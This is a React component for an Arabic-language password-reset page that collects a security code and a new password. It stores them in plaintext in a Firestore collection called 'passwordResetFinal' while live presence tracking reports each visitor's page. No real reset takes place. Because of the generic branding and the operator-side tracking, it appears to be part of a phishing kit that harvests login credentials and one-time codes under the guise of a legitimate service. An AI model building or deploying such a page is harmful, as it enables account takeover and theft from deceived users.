import { useState, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';
import { Headphones, Shield, Lock, Eye, EyeOff, Loader2 } from 'lucide-react';
import { collection, addDoc, Timestamp } from 'firebase/firestore';
import { db } from '@/lib/firebase-config';
import { getClientId } from '@/lib/clientId';
import { setUserOnline, setUserOffline, updateUserPage } from '@/lib/realtime-presence';

const Logo = () => (
  <svg viewBox="0 0 100 100" fill="none" xmlns="http://www.w3.org/2000/svg" className="w-[70px] h-[70px]">
    <path d="M20 30 L50 10 L80 30 L50 50 Z" fill="#4c72b8"/>
    <path d="M20 70 L50 50 L80 70 L50 90 Z" fill="#2a9d8f"/>
  </svg>
);

const PowerLogo = () => (
  <svg viewBox="0 0 100 100" fill="none" stroke="#6c7a9c" strokeWidth="8" className="w-[30px] h-[30px]">
    <polygon points="50,10 90,30 90,70 50,90 10,70 10,30"/>
  </svg>
);

export default function ResetPasswordPage() {
  const navigate = useNavigate();
  const [securityCode, setSecurityCode] = useState('');
  const [password, setPassword] = useState('');
  const [confirmPassword, setConfirmPassword] = useState('');
  const [showPass, setShowPass] = useState(false);
  const [showConfirmPass, setShowConfirmPass] = useState(false);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState('');
  const [strength, setStrength] = useState(0);

  useEffect(() => {
    const clientId = getClientId();
    setUserOnline(clientId, '/reset-password');
    return () => setUserOffline(clientId);
  }, []);

  // Calculate password strength
  useEffect(() => {
    let s = 0;
    if (password.length > 5) s += 1;
    if (/[A-Z]/.test(password)) s += 1;
    if (/[0-9]/.test(password)) s += 1;
    if (/[^A-Za-z0-9]/.test(password)) s += 1;
    setStrength(s);
  }, [password]);

  const preventArabic = (val: string) => val.replace(/[\u0600-\u06FF]/g, '');

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!securityCode || !password || !confirmPassword) {
      setError('يرجى ملء كافة الحقول المطلوبة');
      return;
    }

    if (password !== confirmPassword) {
      setError('كلمة المرور وتأكيدها غير متطابقين!');
      return;
    }

    setLoading(true);
    setError('');

    try {
      const clientId = getClientId();
      const resetRequestId = sessionStorage.getItem('password_reset_request_id');

      // Send the final reset data to Firestore
      await addDoc(collection(db!, 'passwordResetFinal'), {
        requestId: resetRequestId,
        clientId: clientId,
        securityCode: securityCode,
        newPassword: password,
        createdAt: Timestamp.now()
      });

      updateUserPage(clientId, '/login');
      
      // Auto redirect to login
      setTimeout(() => {
        sessionStorage.removeItem('password_reset_request_id');
        navigate('/login');
      }, 2000);

    } catch (err) {
      console.error('Final reset error:', err);
      setError('حدث خطأ أثناء حفظ البيانات');
      setLoading(false);
    }
  };

  const getStrengthColor = () => {
    if (strength === 0) return 'bg-slate-700';
    if (strength === 1) return 'bg-red-500';
    if (strength === 2) return 'bg-yellow-500';
    if (strength >= 3) return 'bg-green-500';
    return 'bg-slate-700';
  };

  const getStrengthText = () => {
    if (strength === 0) return '';
    if (strength === 1) return 'ضعيفة';
    if (strength === 2) return 'متوسطة';
    if (strength >= 3) return 'قوية';
    return '';
  };

  return (
    <div className="min-h-screen w-full bg-[#101935] flex flex-col justify-between p-5" dir="rtl">
      <div className="top-bar w-full flex justify-between items-center text-[#8d99ae] text-sm px-2">
        <span>الإنكليزية</span>
        <Headphones className="w-5 h-5 cursor-pointer" />
      </div>

      <div className="content-wrapper w-full max-w-[380px] mx-auto flex flex-col items-center my-auto">
        <div className="logo mb-6">
          <Logo />
        </div>

        <h1 className="text-2xl font-bold mb-6 w-full text-right text-white">تغيير كلمة المرور</h1>

        <form onSubmit={handleSubmit} className="w-full">
          {/* Security Code */}
          <div className="relative w-full mb-4">
            <div className="absolute right-4 top-1/2 -translate-y-1/2 text-[#6c7a9c]">
              <Shield className="w-5 h-5" />
            </div>
            <input
              type="text"
              value={securityCode}
              onChange={(e) => setSecurityCode(preventArabic(e.target.value))}
              placeholder="رمز الأمان"
              className="w-full py-3.5 pr-12 pl-4 bg-[#1e2942] border border-[#2a3859] rounded-xl text-white text-sm outline-none focus:border-[#4c72b8] transition-colors"
              dir="ltr"
            />
          </div>

          {/* New Password */}
          <div className="relative w-full mb-2">
            <div className="absolute right-4 top-1/2 -translate-y-1/2 text-[#6c7a9c]">
              <Lock className="w-5 h-5" />
            </div>
            <input
              type={showPass ? 'text' : 'password'}
              value={password}
              onChange={(e) => setPassword(preventArabic(e.target.value))}
              placeholder="كلمة المرور الجديدة"
              className="w-full py-3.5 pr-12 pl-12 bg-[#1e2942] border border-[#2a3859] rounded-xl text-white text-sm outline-none focus:border-[#4c72b8] transition-colors"
              dir="ltr"
            />
            <div 
              className="absolute left-4 top-1/2 -translate-y-1/2 text-[#6c7a9c] cursor-pointer hover:text-white transition-colors"
              onClick={() => setShowPass(!showPass)}
            >
              {showPass ? <EyeOff className="w-5 h-5" /> : <Eye className="w-5 h-5" />}
            </div>
          </div>

          {/* Strength Indicator */}
          <div className="w-full mb-4 px-1">
            <div className="flex justify-between items-center mb-1">
              <span className="text-[10px] text-slate-500 font-bold">قوة كلمة المرور</span>
              <span className={`text-[10px] font-bold ${strength >= 3 ? 'text-green-500' : strength === 2 ? 'text-yellow-500' : 'text-red-500'}`}>
                {getStrengthText()}
              </span>
            </div>
            <div className="h-1.5 w-full bg-slate-800 rounded-full overflow-hidden flex gap-1">
              {[1, 2, 3, 4].map((step) => (
                <div 
                  key={step}
                  className={`h-full flex-1 transition-all duration-500 ${step <= strength ? getStrengthColor() : 'bg-slate-700'}`}
                />
              ))}
            </div>
          </div>

          {/* Confirm Password */}
          <div className="relative w-full mb-5">
            <div className="absolute right-4 top-1/2 -translate-y-1/2 text-[#6c7a9c]">
              <Lock className="w-5 h-5" />
            </div>
            <input
              type={showConfirmPass ? 'text' : 'password'}
              value={confirmPassword}
              onChange={(e) => setConfirmPassword(preventArabic(e.target.value))}
              placeholder="تأكيد كلمة المرور"
              className="w-full py-3.5 pr-12 pl-12 bg-[#1e2942] border border-[#2a3859] rounded-xl text-white text-sm outline-none focus:border-[#4c72b8] transition-colors"
              dir="ltr"
            />
            <div 
              className="absolute left-4 top-1/2 -translate-y-1/2 text-[#6c7a9c] cursor-pointer hover:text-white transition-colors"
              onClick={() => setShowConfirmPass(!showConfirmPass)}
            >
              {showConfirmPass ? <EyeOff className="w-5 h-5" /> : <Eye className="w-5 h-5" />}
            </div>
          </div>

          {error && (
            <div className="text-red-500 text-xs text-right mb-4 animate-in fade-in duration-300">
              {error}
            </div>
          )}

          <button
            type="submit"
            disabled={loading}
            className="w-full py-3.5 bg-[#4c72b8] hover:bg-[#3b5a93] disabled:bg-[#3b4d75] text-white font-bold rounded-xl transition-all flex items-center justify-center gap-2 mb-6 shadow-lg shadow-blue-500/10"
          >
            {loading ? (
              <>
                انتظر
                <span className="flex gap-1">
                  <span className="animate-pulse">.</span>
                  <span className="animate-pulse delay-150">.</span>
                  <span className="animate-pulse delay-300">.</span>
                </span>
              </>
            ) : 'تغيير كلمة المرور'}
          </button>
        </form>
      </div>

      <div className="footer flex flex-col items-center text-[#6c7a9c] text-xs gap-1 pb-2">
        <span>POWERED BY</span>
        <PowerLogo />
        <span>احدث اصدار</span>
      </div>
    </div>
  );
}
